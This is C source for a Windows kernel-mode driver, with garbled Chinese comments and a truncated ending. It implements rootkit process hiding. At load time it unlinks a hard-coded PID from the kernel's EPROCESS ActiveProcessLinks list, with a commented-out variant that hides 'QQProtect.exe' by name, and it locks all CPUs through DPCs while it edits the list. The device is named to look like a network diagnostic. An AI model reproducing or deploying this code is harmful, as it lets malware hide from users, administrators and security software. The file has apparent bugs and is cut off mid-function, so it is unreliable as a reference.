#include <ntddk.h>
#include "datatype.h"
#include "dbgmsg.h"
#include "ctrlcode.h"
#include "device.h"
// ʹ�� build  /D /g /b /B /e /F /S /s /$ /why /v /w /y  ������������Դ�ļ�
//#define MEM_TAG  "UseForCopyFile"
// ע�⣺������ͨ��sc.exe�������ں˿ռ�ʱ����ʹ������ʵ�ֵ�ͬ������������ȫ�ֵĻ��������Ȼ������
//ָ��pid�Ľ��̣���������ж��ʱ�����ỹԭ��������޸ģ���˲�������Ŀ����̡���Ҫ��д������߼���
// ����ж��ʱ�������صĽ��̣���������ϵͳҲ���ԣ�
//��Ҫ�ڶ��ϵͳ�ϲ��Դ������Ļ�������߼��Ƿ��ܹ�������������֮��ᵼ��bugcheck����

#define EPROCESS_OFFSET_PID				0xb4		//�� EPROCESS.UniqueProcessId ��ƫ����Ϊ 0xb4 �ֽ�
#define EPROCESS_OFFSET_NAME				0x16c		//�� EPROCESS.ImageFileName ��ƫ����Ϊ 0x16c �ֽ�
#define EPROCESS_OFFSET_LINKS				0xb8			//�� EPROCESS.ActiveProcessLinks ��ƫ����Ϊ 0xb8 �ֽ�
#define SZ_EPROCESS_NAME					0x010	// ԭʼ�ĵ������У��������ƴ洢�ڳ���Ϊ15���ֽ��ַ������У�
											// ����ѳ��ȸ�Ϊ16��Ϊ�˰����һ��Ԫ�ظ�ֵΪ\0��β��־


/* MSNetDigaDeviceObject�������Ǵ������豸 */
PDEVICE_OBJECT MSNetDiagDeviceObject;
/* DriverObjectRef��������ע������� */
PDRIVER_OBJECT DriverObjectRef;
KIRQL  RaiseIRQL();
PKDPC  AcquireLock();
NTSTATUS  ReleaseLock(PVOID  dpc_pointer);
void  LowerIRQL(KIRQL  prev);
void  lockRoutine(IN  PKDPC  dpc, IN  PVOID  context, IN  PVOID  arg1, IN  PVOID  arg2);
//extern void NOP_FUNC(void);
BYTE*  getNextEPROCESSpointer(BYTE*  currentEPROCESSpointer);
//BYTE*  getNextEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer);
BYTE*  getPreviousEPROCESSpointer(BYTE*  currentEPROCESSpointer);
//BYTE*  getPreviousEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer);
void  getProcessName(char  *dest, char  *src);
int  getPID(BYTE*  currentEPROCESSpointer);
//unsigned char*  get_proc_name(BYTE*  currentEPROCESSpointer);
void  WalkProcessList(DWORD  pid);
//void  WalkProcessListWithName(unsigned char* trg_proc_nme);
void  HideProcess(DWORD*  pid);
//void  HideProcessWithName(unsigned char* trg_proc_nme);
void  adjustProcessListEntry(BYTE*  currentEPROCESSpointer);
//void  adjustProcessListEntryWithProcName(BYTE*  currentEPROCESSpointer);
void TestCommand(PVOID inputBuffer, PVOID outputBuffer, ULONG inputBufferLength, ULONG outputBufferLength);
NTSTATUS defaultDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS dispatchIOControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);



NTSTATUS RegisterDriverDeviceName(IN PDRIVER_OBJECT DriverObject);
NTSTATUS RegisterDriverDeviceLink();
//�������Ϊȫ�ֱ����������޷�ͨ�����루�����ֲ�����δ��ʼ����

KIRQL  old_irql;
KSPIN_LOCK  get_spin_lock;


// �����3��ȫ�ֱ��������ڶദ����ϵͳ��ͬ����OS��Դ�ķ���
 
PKDPC  dpcPointer;		//һ��ָ�룬ָ���� DPC���ӳٹ��̵��ã����󹹳ɵ����飻ÿ������/�˱�����һ���������飻ÿ�������ϵ� DPC
					// ���������� DISPATCH_LEVEL ������˿��Թ���ô�����/�������е� OS���̵߳��ȴ���ʵ��ͬ����
DWORD has_finished_access_os_res;		//����ɶ�OS��Դ��ͬ������ʱ��Ӧ���˱�־��1
DWORD nCPUsLocked;		//��ʶ��ǰ��ͬ���˵ģ������� DISPATCH_LEVEL��CPU/���������˱���Ӧ��ͨ�� InterLocked*() ϵ������ԭ�ӵؽ��ж�д
// ����һ��λ���ⲿ���Դ�ļ���.../amd64/lib.asm���еĺ�����������ִ�� nop ��ָ��

// ���ļ��������£�
// ���ļ�������Ϊ AMD64 ��ϵ�ṹ��ָ���� /amd64 ����ѡ��ʱ�ã�������Ĭ�ϵ� x86/i386 ����ѡ������������ⲿ������
// ���������������� __asm{nop;}
/*
.CODE
public NOP_FUNC
NOP_FUNC PROC
nop
ret
NOP_FUNC ENDP
END
*/


VOID Unload(IN PDRIVER_OBJECT DriverObject)
{
	PDEVICE_OBJECT pdeviceObj;
	UNICODE_STRING unicodeString;
	DBG_TRACE("OnUnload","Received signal to unload the driver");
	pdeviceObj = (*DriverObject).DeviceObject;
	if(pdeviceObj != NULL)
	{
		DBG_TRACE("OnUnload","Unregistering driver's symbolic link");
		RtlInitUnicodeString(&unicodeString, DeviceLinkBuffer);
		IoDeleteSymbolicLink(&unicodeString);
		DBG_TRACE("OnUnload","Unregistering driver's device name");
		IoDeleteDevice((*DriverObject).DeviceObject);
	}
	return ;
}


/* 
 * DriverObject�൱��ע���������DeviceObjectΪ��Ӧĳ�������豸
 * һ���������Դ�������豸��Ȼ��ͨ��DriverObject::DeviceObject��
 * DeviceObject::NextDevice���������豸����
 */
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	//��Ϊ DriverEntry() ������ PASSIVE_LEVEL �жϼ�������ֻ���� PASSIVE_LEVEL ���õ��ں����̶�Ӧ�÷��� DriverEntry()
	//�ڲ����ã�����ʹ�� DbgPrint() ��ӡ unicode �ַ���ʱ
	//  WDK �ж���Ĳ������������봫ͳ C ��׼���������Ͷ�Ӧ��ϵ���£�
	// ULONG -> unsigned long
	// UCHAR -> unsigned char
	// UINT -> unsigned int
	// VOID -> void 
	// PULONG ->unsigned long* 
	// PUCHAR -> unsigned char*
	// PUINT -> unsigned int*
	// PVOID -> void*
	
	//unsigned char*  target_hide_process_name = 'QQProtect.exe\0'
	DWORD proc_pid = 1548;

	

	LARGE_INTEGER clock_interval_count_since_booted;
									//���е��ڲ��������������ȶ���
	int i;						//������������ǰ�棬�����޷�ͨ������
	ULONG  millsecond_count_per_clock;
	ULONG  l00nanosecond_count_per_clock;
	NTSTATUS  ntStatus;	//������������ǰ�棬�����޷�ͨ������
	ULONG  data_length;
	HANDLE  my_key_handle = NULL;
	NTSTATUS  returnedStatus;
	

	UNICODE_STRING  my_key_path = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
	UNICODE_STRING  my_key_name = RTL_CONSTANT_STRING(L"SystemRoot");
	KEY_VALUE_PARTIAL_INFORMATION  not_complete_key_infor;
	PKEY_VALUE_PARTIAL_INFORMATION  acturally_use_key_infor;
	ULONG  acturally_key_value_length;
	OBJECT_ATTRIBUTES   my_obj_attr;
	InitializeObjectAttributes(&my_obj_attr, &my_key_path, OBJ_CASE_INSENSITIVE, NULL, NULL);
	returnedStatus = ZwOpenKey(&my_key_handle, KEY_READ, &my_obj_attr);
	if (!NT_SUCCESS(returnedStatus)) {
		DBG_TRACE("Driver Entry", ".................cannot open registry key...........");
	}

	returnedStatus = ZwQueryValueKey(my_key_handle,
																&my_key_name,
																KeyValuePartialInformation,
																&not_complete_key_infor,
																sizeof(KEY_VALUE_PARTIAL_INFORMATION),
																&acturally_key_value_length);

	if (!NT_SUCCESS(returnedStatus)
		&& returnedStatus != STATUS_BUFFER_OVERFLOW
		&& returnedStatus != STATUS_BUFFER_TOO_SMALL) {
		DBG_TRACE("Driver Entry", ".................you pass the wrong arg or the key value...........");
	}

acturally_use_key_infor = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, acturally_key_value_length, 'MyTg');
	if (acturally_use_key_infor == NULL) {
		returnedStatus = STATUS_INSUFFICIENT_RESOURCES;
		DBG_TRACE("Driver Entry", "..........................cannot allocate kernel mode heap memory.........................");
	}

	returnedStatus = ZwQueryValueKey(my_key_handle,
																&my_key_name,
																KeyValuePartialInformation,
																acturally_use_key_infor,
																acturally_key_value_length,
																&acturally_key_value_length);

	if (NT_SUCCESS(returnedStatus)) {
		for (data_length = 0;  data_length < acturally_use_key_infor->DataLength;  data_length++) {
			DbgPrint("the SystemRoot=   %c\n",  acturally_use_key_infor->Data[data_length]);
		}
		
			
	} else { 
		DBG_TRACE("Driver Entry", ".................query registry key value failed......................"); 
	}
	//ע�⣬DbgPrint ���̲�֧���κθ������ͣ�%f��%e��%E��%g��%G��%a �� %A������˴�ӡ�����������ϵͳ����
	l00nanosecond_count_per_clock = KeQueryTimeIncrement();
	millsecond_count_per_clock = l00nanosecond_count_per_clock / 10000;
	DbgPrint("................per system clock interval is   %u   100nanoseconds................", l00nanosecond_count_per_clock);
	
	DbgPrint("................per system clock interval is   %u   millseconds...............", millsecond_count_per_clock);
	KeQueryTickCount(&clock_interval_count_since_booted);
	DbgPrint(".............  the system clock interval count since booted is   %u  times  ...................",  clock_interval_count_since_booted.LowPart);
	DbgPrint(".............  the higher 4 bytes of clock_interval_count_since_booted is   %i  times  ...................",  clock_interval_count_since_booted.HighPart);
	//ϵͳ�жϴ�������ÿ�жϵĺ������͵õ��������������ĺ�����
	
	HideProcess(&proc_pid);
	//HideProcessWithName(target_hide_process_name);

	DBG_TRACE("Driver Entry","Driver has benn loaded");
	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
	{
		(*DriverObject).MajorFunction[i] = defaultDispatch;
	}
	(*DriverObject).MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispatchIOControl;
	(*DriverObject).DriverUnload = Unload;

	DBG_TRACE("Driver Entry","Registering driver's device name");
	ntStatus = RegisterDriverDeviceName(DriverObject);
	if(!NT_SUCCESS(ntStatus))
	{
		DBG_TRACE("Driver Entry","Failed to create device");
		return ntStatus;
	}

	DBG_TRACE("Driver Entry","Registering driver's symbolic link");
	if(!NT_SUCCESS(ntStatus))
	{
		DBG_TRACE("Driver Entry","Failed to create symbolic link");
		return ntStatus;
	}
	DriverObjectRef = DriverObject;
	return STATUS_SUCCESS;
}
/*
 * IRP.IoStatus : ����ΪIO_STATUS_BLOCK
 * A driver sets an IRP's I/O status block to indicate the final status of 
 * an I/O request, before calling IoCompleteRequest for the IRP.
 typedef struct _IO_STATUS_BLOCK {
  union {
    NTSTATUS Status;
    PVOID    Pointer;
  };
  ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK

  Status: This is the completion status, either STATUS_SUCCESS if the 
          requested operation was completed successfully or an informational, 
          warning, or error STATUS_XXX value. 
  Information: This is set to a request-dependent value. For example, 
          on successful completion of a transfer request, this is set 
		  to the number of bytes transferred. If a transfer request is 
		  completed with another STATUS_XXX, this member is set to zero.

 */



NTSTATUS defaultDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP IRP)
{
	((*IRP).IoStatus).Status = STATUS_SUCCESS;
	((*IRP).IoStatus).Information = 0;
	/*
	 The IoCompleteRequest routine indicates that the caller has 
	 completed all processing for a given I/O request and is 
	 returning the given IRP to the I/O manager.
	 */
	IoCompleteRequest(IRP, IO_NO_INCREMENT);
	return (STATUS_SUCCESS);
}
/*
 * I/O��ջ��Ԫ��IO_STACK_LOCATION���壬ÿһ����ջ��Ԫ����Ӧһ���豸����
 * ����֪������һ�����������У����Դ���һ�������豸���󣬶���Щ�豸����
 * ����Ӧ��һ��IO_STACK_LOCATION�ṹ�壬�������������еĶ���豸���󣬶�
 * ��Щ�豸����֮��Ĺ�ϵΪˮƽ��ι�ϵ��
 * Parameters Ϊÿ�����͵� request �ṩ���������磺Create(IRP_MJ_CREATE ���󣩣�
 * Read��IRP_MJ_READ ���󣩣�StartDevice��IRP_MJ_PNP ������ IRP_MN_START_DEVICE��
 * 
	//
	// NtDeviceIoControlFile ����
	//
	struct
	{
		ULONG OutputBufferLength;
		ULONG POINTER_ALIGNMENT InputBufferLength;
		ULONG POINTER_ALIGNMENT IoControlCode;
		PVOID Type3InputBuffer;
	} DeviceIoControl;
	��DriverEntry�����У���������dispatchIOControl����IRP_MJ_DEVICE_CONTROL
	���͵����������dispatchIOControl�У�����ֻ����IOCTL����Parameters��
	ֻ����DeviceIoControl��Ա
 */




NTSTATUS dispatchIOControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP IRP)
{
	PIO_STACK_LOCATION irpStack;
	PVOID inputBuffer;
	PVOID outputBuffer;
	ULONG inBufferLength;
	ULONG outBufferLength;
	ULONG ioctrlcode;
	NTSTATUS ntStatus;
	ntStatus = STATUS_SUCCESS;
	((*IRP).IoStatus).Status = STATUS_SUCCESS;
	((*IRP).IoStatus).Information = 0;
	inputBuffer = (*IRP).AssociatedIrp.SystemBuffer;
	outputBuffer = (*IRP).AssociatedIrp.SystemBuffer;
	irpStack = IoGetCurrentIrpStackLocation(IRP);
	inBufferLength = (*irpStack).Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = (*irpStack).Parameters.DeviceIoControl.OutputBufferLength;
	ioctrlcode = (*irpStack).Parameters.DeviceIoControl.IoControlCode;

	DBG_TRACE("dispatchIOControl","Received a command");
	switch(ioctrlcode)
	{
	case IOCTL_TEST_CMD:
		{
			TestCommand(inputBuffer, outputBuffer, inBufferLength, outBufferLength);
			((*IRP).IoStatus).Information = outBufferLength;
		}
		break;
	default:
		{
			DBG_TRACE("dispatchIOControl","control code not recognized");
		}
		break;
	}
	/* �ڴ���������󣬵���IoCompleteRequest */
	IoCompleteRequest(IRP, IO_NO_INCREMENT);
	return(ntStatus);
}




void TestCommand(PVOID inputBuffer, PVOID outputBuffer, ULONG inputBufferLength, ULONG outputBufferLength)
{
	char *ptrBuffer;
	DBG_TRACE("dispathIOControl","Displaying inputBuffer");
	ptrBuffer = (char*)inputBuffer;
	DBG_PRINT2("[dispatchIOControl]: inputBuffer=%s\n", ptrBuffer);
	DBG_TRACE("dispatchIOControl","Populating outputBuffer");
	ptrBuffer = (char*)outputBuffer;
	ptrBuffer[0] = '!';
	ptrBuffer[1] = '1';
	ptrBuffer[2] = '2';
	ptrBuffer[3] = '3';
	ptrBuffer[4] = '!';
	ptrBuffer[5] = '\0';
	DBG_PRINT2("[dispatchIOControl]:outputBuffer=%s\n", ptrBuffer);
	return;
}




BYTE*  getNextEPROCESSpointer(BYTE*  currentEPROCESSpointer)
{
	BYTE*  nextEPROCESSpointer = NULL;
	BYTE*  flink = NULL;
	LIST_ENTRY  ListEntry;
	ListEntry = *((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	flink = (BYTE*)(ListEntry.Flink);
	nextEPROCESSpointer = (flink - EPROCESS_OFFSET_LINKS);
	return nextEPROCESSpointer;
}




BYTE*  getPreviousEPROCESSpointer(BYTE*  currentEPROCESSpointer)
{
	BYTE*  prevEPROCESSpointer = NULL;
	BYTE*  blink = NULL;
	LIST_ENTRY  ListEntry;
	ListEntry = *((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	blink = (BYTE*)(ListEntry.Blink);
	prevEPROCESSpointer = (blink - EPROCESS_OFFSET_LINKS);
	return prevEPROCESSpointer;
}




void  getProcessName(char  *dest,  char  *src)
{
	//		BYTE					BYTE*
	// dest:processName   src: (currentEPROCESSpointer + EPROCESS_OFFSET_NAME) ����ӳ���������Ƴ���Ϊ16�ֽ� 
	strncpy(dest, src, SZ_EPROCESS_NAME);

	// ���һ��Ԫ�أ�16-1=15��Ϊ��ʾ�ַ�����β��\0 �ַ�
	dest[SZ_EPROCESS_NAME - 1] = '\0';

	return;
}



int  getPID(BYTE*  currentEPROCESSpointer)
{
	int  *pid;
	pid = (int *)(currentEPROCESSpointer + EPROCESS_OFFSET_PID);
	return (*pid);
}



void  HideProcess(DWORD*  pid){
	//����ͬ������ EPROCESS �ṹ��ɵ�˫������ķ��ʣ�ʵ�ʵķ������� WalkProcessList() �����н��еģ�Ϊ��ȷ�� WalkProcessList()
	//�ڱ��������еĽڵ�ʱ��ͬһʱ�䲻���������߳�Ҳ�Ը�����ִ�в����ɾ������������ʹ����������ͬ����
	//���⣬����������� IRQL ������ DISPATCH_LEVEL ������ȱҳ�쳣�������޷�ִ��ҳ�滻���������˳���ԱҪȷ��ϣ�����ʵ�
	//�ں��ڴ�ӳ�䵽������ҳ�治�ᱻ�����������ϡ���EPROCESS �ṹ�ڷǻ�ҳ���з��䣬���û��������⣩
	//KeAcquireSpinLock-KeReleaseSpinLock ���Զ������ͻָ� IRQL ���û�б�Ҫ���ж���� KeRaiseIrql-KeLowerIrql ����
	
	/*KeInitializeSpinLock(&get_spin_lock);
	KeAcquireSpinLock(&get_spin_lock, &old_irql);
	WalkProcessList(*pid);
	KeReleaseSpinLock(&get_spin_lock, old_irql);*/
	
	// ����ʹ��������ϵ�еĺ����ڵ�������/���ϣ�����������ϣ����Գɹ�ͬ����OS��Դ�ķ��ʣ�
	//���ڶദ����/��ϵͳ�ϣ���Ҫʹ������Ļ�����ͬ����OS��Դ�ķ��ʡ��������� WalkProcessList() ����ǰ��Ĵ����滻�����£�
   
	old_irql = RaiseIRQL();
	dpcPointer = AcquireLock();
     WalkProcessList(*pid);
     ReleaseLock(dpcPointer);
     LowerIRQL(old_irql);
   

	return;

}



void  WalkProcessList(DWORD  pid)
{
	BYTE*   currentEPROCESSpointer = NULL;
	BYTE*   nextEPROCESSpointer = NULL;
	int  currentPID = 0;
	int  targetPID = 0;

	//�˾ֲ����鳤��Ϊ15�ֽڣ��±��0��15��
	BYTE  processName[SZ_EPROCESS_NAME];

	int  fuse = 0;
	const  int  walkThreshold = 1048576;


	currentEPROCESSpointer = (UCHAR*)PsGetCurrentProcess();
	/*
	0: kd> dt nt!_KTHREAD Tcb ServiceTable be28bca0
	+0x0bc ServiceTable : 0x843b5b00 Void
	0: kd> dd 843b5b00 L4
	843b5b00  842ca43c 00000000 00000191 842caa84
	0: kd> ? KiServiceTable
	Evaluate expression: -2077449156 = 842ca43c
	0: kd> dps 842ca43c L4
	842ca43c  844c5fbf nt!NtAcceptConnectPort
	842ca440  8430d855 nt!NtAccessCheck
	842ca444  84455d47 nt!NtAccessCheckAndAuditAlarm
	842ca448  84271897 nt!NtAccessCheckByType
	0: kd>
	PETHREAD	currentThread;
	PVOID  ki_service_table;
	currentThread = PsGetCurrentThread();
	ki_service_table = &(currentThread->Tcb.ServiceTable);

	*/

	currentPID = getPID(currentEPROCESSpointer);

	//�ѽ���ӳ�����Ƹ��Ƶ���������processName�ڣ��趨���һ���ַ�Ϊ\0
	getProcessName(processName, (currentEPROCESSpointer + EPROCESS_OFFSET_NAME));
	targetPID = currentPID;

	if (pid == currentPID)
	{
		adjustProcessListEntry(currentEPROCESSpointer);
		DBG_PRINT2("...........................hidding process , pid =  %u..........................", pid);
		return;
	}
	

	nextEPROCESSpointer = getNextEPROCESSpointer(currentEPROCESSpointer);
	currentEPROCESSpointer = nextEPROCESSpointer;
	currentPID = getPID(currentEPROCESSpointer);
	getProcessName(processName,  currentEPROCESSpointer + EPROCESS_OFFSET_NAME);


	// while ѭ���˳��������ǣ�targetPID == currentPID����Ϊǰ��Ĵ����߼��� targetPID ��ʼ��Ϊ��ǰִ�н��̵� PID��
	//Ȼ�󱣳ֲ��䣬���ҵ�ǰִ�н��̵� EPROCESS �ṹ��Ϊ����ͷ������ targetPID ���ܹ���ʶ��ͷ����
	//��һ���棬�ֲ����� currentPID ��ÿһ��ѭ���ĵ����ж������£��� currentPID ���� targetPID ʱ��˵�����ε�������������Ľ�β
	//����β����� LIST_ENTRY.Flink ָ���ͷ�� LIST_ENTRY.Flink������ currentPID �ٴα�����Ϊ��ͷ���̵� PID ʱ���˳�ѭ����
	while (targetPID != currentPID)
	{
		if (currentPID == pid)
		{
			adjustProcessListEntry(currentEPROCESSpointer);
			DBG_PRINT2(".....................hidding process , pid =  %u............................", pid);
			return;
		}

		nextEPROCESSpointer = getNextEPROCESSpointer(currentEPROCESSpointer);
		currentEPROCESSpointer = nextEPROCESSpointer;
		currentPID = getPID(currentEPROCESSpointer);
		getProcessName(processName, (currentEPROCESSpointer + EPROCESS_OFFSET_NAME));
		fuse++;
		if (fuse == walkThreshold)
		{
			return;
		}

	}

	DBG_PRINT2(".................searched  %d  Processes, no mattch one\n...................", fuse);
	DBG_PRINT2("......................NO match Process for PID =  %u\n.............................", pid);
	return;
}




void  adjustProcessListEntry(BYTE*  currentEPROCESSpointer)
{
	BYTE*  prevEPROCESSpointer = NULL;
	BYTE*  nextEPROCESSpointer = NULL;
	int  currentPID = 0;
	int  prevPID = 0;
	int  nextPID = 0;
	LIST_ENTRY*  currentListEntry;
	LIST_ENTRY*  prevListEntry;
	LIST_ENTRY*  nextListEntry;

	currentPID = getPID(currentEPROCESSpointer);
	prevEPROCESSpointer = getPreviousEPROCESSpointer(currentEPROCESSpointer);
	prevPID = getPID(prevEPROCESSpointer);

	nextEPROCESSpointer = getNextEPROCESSpointer(currentEPROCESSpointer);
	nextPID = getPID(nextEPROCESSpointer);

	//�ֱ�ȡ�õ�ǰ�����ڵ� 2 �� ERROCESS �� ActiveProcessLinks �ֶΣ�һ�� LIST_ENTRY ����

	currentListEntry = ((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	prevListEntry = ((LIST_ENTRY*)(prevEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	nextListEntry = ((LIST_ENTRY*)(nextEPROCESSpointer + EPROCESS_OFFSET_LINKS));

	//�ֱ��޸������е��ض��ֶΣ�Flink �� Blink����ʵ�����ص�ǰ�� ERROCESS

	//ǰһ�� ERROCESS  �� ActiveProcessLinks.Flink ָ����һ�� ERROCESS  �� ActiveProcessLinks.Flink
	//��һ�� ERROCESS  �� ActiveProcessLinks.Blink ָ��ǰһ�� ERROCESS  �� ActiveProcessLinks.Flink
	//����ƹ��˵�ǰ���м䣩�� ERROCESS �� ActiveProcessLinks
	(*prevListEntry).Flink = nextListEntry;
	(*nextListEntry).Blink = prevListEntry;

	//��ǰ ERROCESS �� ActiveProcessLinks.Flink �� ActiveProcessLinks.Blink ָ�� ActiveProcessLinks �����������з���
	(*currentListEntry).Flink = currentListEntry;
	(*currentListEntry).Blink = currentListEntry;

	return;
}





NTSTATUS RegisterDriverDeviceName(IN PDRIVER_OBJECT DriverObject)
{
	NTSTATUS ntStatus;
	UNICODE_STRING unicodeString;
	/* ����DeviceNameBuffer����ʼ��unicodeString */
	RtlInitUnicodeString(&unicodeString, DeviceNameBuffer);
	/*
	 * ����һ���豸���豸����ΪFILE_DEVICE_RK���������Լ���device.h�ж���)��
	 * �������豸������MSNetDiagDeviceObject��
	 */
	ntStatus = IoCreateDevice
		(
		    DriverObject,
			0,
			&unicodeString,
			FILE_DEVICE_RK,
			0,
			TRUE,&MSNetDiagDeviceObject
		);
	return (ntStatus);
}





NTSTATUS RegisterDriverDeviceLink()
{
	NTSTATUS ntStatus;
	UNICODE_STRING unicodeString;
	UNICODE_STRING unicodeLinkString;
	RtlInitUnicodeString(&unicodeString, DeviceNameBuffer);
	RtlInitUnicodeString(&unicodeString, DeviceLinkBuffer);
	/*
	 * IoCreateSymbolicLink����һ���豸���ӡ�������������Ȼע�����豸��
	 * ����ֻ�����ں��пɼ���Ϊ��ʹӦ�ó���ɼ���������Ӵ����¶һ������
	 * ���ӣ�������ָ���������豸��
	 */
	ntStatus = IoCreateSymbolicLink(&unicodeLinkString, &unicodeString);
	return (ntStatus);
}


//������Щ����������SMPϵͳ��ͬ����Windows�ں���Դ�ķ��ʣ�����Ҫôֱ�ӻ����� HideProcess() �б����ã�

KIRQL  RaiseIRQL() {
		KIRQL  curr;
		KIRQL  prev;
		curr = KeGetCurrentIrql();
		if (curr < DISPATCH_LEVEL) {
				KeRaiseIrql(DISPATCH_LEVEL,  &prev);
		}
		prev = curr;
		return prev;
}


PKDPC  AcquireLock() {
		PKDPC  dpcArray;
		DWORD  current_cpu;
		DWORD  i;
		DWORD  nOtherCPUs;
		if (KeGetCurrentIrql() != DISPATCH_LEVEL) {
				return  NULL;
		}
		DBG_TRACE("AcquireLock",  "current cpu Executing at IRQL == DISPATCH_LEVEL");
		InterlockedAnd(&has_finished_access_os_res,  0);
		InterlockedAnd(&nCPUsLocked,  0);
		DBG_PRINT2("[AcquireLock]:  CPUs number = %u\n",  KeNumberProcessors);// %u:  �޷���ʮ����������

		//�˴��� ExAllocatePoolWithTag() �������Ĳ���������Ҫ������д����������δ֪ԭ�򣬻ᱨ��ú���δ����
		dpcArray = (PKDPC)ExAllocatePoolWithTag(NonPagedPool,
			KeNumberProcessors * sizeof(KDPC), 0xABCD);
		if (dpcArray == NULL) {
				return  NULL;
		}
		current_cpu = KeGetCurrentProcessorNumber();
		DBG_PRINT2("[AcquireLock]:  current_cpu = Core %u\n",  current_cpu);
		for (i = 0;  i < KeNumberProcessors;  i++) {
				PKDPC  dpcPtr  =  &(dpcArray[i]);
				if ( i != current_cpu) {
						KeInitializeDpc(dpcPtr,  lockRoutine,  NULL);
						KeSetTargetProcessorDpc(dpcPtr,  i);
						KeInsertQueueDpc(dpcPtr,  NULL,  NULL);
				}
		}
		nOtherCPUs = KeNumberProcessors - 1;
		InterlockedCompareExchange(&nCPUsLocked,  nOtherCPUs,  nOtherCPUs);
		while (nCPUsLocked != nOtherCPUs) {
			__asm {
				nop;
				}
				InterlockedCompareExchange(&nCPUsLocked,  nOtherCPUs,  nOtherCPUs);
		}
		DBG_TRACE("AcquireLock",  "All the other CPUs have been raise to DISPATCH_LEVEL and entered nop-loop, now we can call WalkProcessList() to mutex access resource");
		return  dpcArray;
}


void  lockRoutine(IN  PKDPC  dpc,  IN  PVOID  context,  IN  PVOID  arg1,  IN  PVOID  arg2) {
		DBG_PRINT2("[lockRoutine]:   CPU[%u]  entered nop-loop",  KeGetCurrentProcessorNumber());
		InterlockedIncrement(&nCPUsLocked);
		while (InterlockedCompareExchange(&has_finished_access_os_res,  1,  1) == 0) {
			__asm {
				nop;
				}
		}
		InterlockedDecrement(&nCPUsLocked);
		DBG_PRINT2("lockRoutine]:   CPU[%u]  exited nop-loop",  KeGetCurrentProcessorNumber());
		return;
}


NTSTATUS  ReleaseLock(PVOID  dpc_pointer) {
		InterlockedIncrement(&has_finished_access_os_res);
		InterlockedCompareExchange(&nCPUsLocked,  0,  0);
		while (nCPUsLocked != 0) {
			__asm {
				nop;
				}
				InterlockedCompareExchange(&nCPUsLocked,  0,  0);
		}
		if (dpc_pointer != NULL) {
				ExFreePool(dpc_pointer);
		}
		DBG_TRACE("ReleaseLock",  "All the other CPUs have been exited nop-loop and down to origional IRQL, and these dpc have been released");
		return STATUS_SUCCESS;
}


void  LowerIRQL(KIRQL  prev) {
		KeLowerIrql(prev);
		DBG_TRACE("LowerIRQL",  "current cpu also down to origional IRQL");
		return;
}




/*


void  HideProcessWithName(unsigned char* trg_proc_nme){

	old_irql = RaiseIRQL();
	dpcPointer = AcquireLock();
     WalkProcessListWithName(trg_proc_nme);
     ReleaseLock(dpcPointer);
     LowerIRQL(old_irql);
   

	return;

}



void  WalkProcessListWithName(unsigned char* trg_proc_nme){


	BYTE*   currentEPROCESSpointer = NULL;
	BYTE*   nextEPROCESSpointer = NULL;
	unsigned char*  current_proc_name = NULL;
	unsigned char*  target_proc_name = NULL;


	int  fuse = 0;
	const  int  walkThreshold = 1048576;


	currentEPROCESSpointer = (UCHAR*)PsGetCurrentProcess();


	current_proc_name = get_proc_name(currentEPROCESSpointer);


	target_proc_name = current_proc_name;

	if ( stricmp(trg_proc_nme, current_proc_name) == 0 )
	{
		adjustProcessListEntryWithProcName(currentEPROCESSpointer);
		DBG_PRINT2("...........................hidding process , name =  %s..........................", current_proc_name);
		return;
	}



	nextEPROCESSpointer = getNextEPROCESSpointerForProcName(currentEPROCESSpointer);
	currentEPROCESSpointer = nextEPROCESSpointer;
	current_proc_name = get_proc_name(currentEPROCESSpointer);

// ����ִ�е��˴���current_proc_name����һ����������
//				target_proc_name����ǰ��������
//				nextEPROCESSpointer��ָ����һ������
//				currentEPROCESSpointer��ָ����һ������
// �����˺������߼�����
// while ѭ���˳��������ǣ�target_proc_name == current_proc_name����Ϊǰ��Ĵ����߼��� target_proc_name ��ʼ��Ϊ��ǰִ�н��̵����ƣ�
//Ȼ�󱣳ֲ��䣬���ҵ�ǰִ�н��̵� EPROCESS �ṹ��Ϊ����ͷ������ target_proc_name ���ܹ���ʶ��ͷ��������
//��һ���棬�ֲ����� current_proc_name ��ÿһ��ѭ���ĵ����ж������£��� current_proc_name ���� target_proc_name ʱ��
˵�����ε�������������Ľ�β
//����β����� LIST_ENTRY.Flink ָ���ͷ�� LIST_ENTRY.Flink������ current_proc_name �ٴα�����Ϊ��ͷ���̵� PID ʱ���˳�ѭ����

	while ( stricmp(target_proc_name, current_proc_name) != 0 )
	{
		if ( stricmp(trg_proc_nme, current_proc_name) == 0 ){
			adjustProcessListEntryWithProcName(currentEPROCESSpointer);
			DBG_PRINT2(".....................hidding process , name =  %s............................", current_proc_name);
			return;
		}

		nextEPROCESSpointer = getNextEPROCESSpointerForProcName(currentEPROCESSpointer);
		currentEPROCESSpointer = nextEPROCESSpointer;
		current_proc_name = get_proc_name(currentEPROCESSpointer);

		fuse++;

		if (fuse == walkThreshold){
			return;
		}

	}

	DBG_PRINT2(".................searched  %d  Processes, no mattch one\n...................", fuse);
	DBG_PRINT2("......................NO match Process for name =  %s\n.............................", target_hide_process_name);
	return;


}


void  adjustProcessListEntryWithProcName(BYTE*  currentEPROCESSpointer)
{
	BYTE*  prevEPROCESSpointer = NULL;
	BYTE*  nextEPROCESSpointer = NULL;


	LIST_ENTRY*  currentListEntry;
	LIST_ENTRY*  prevListEntry;
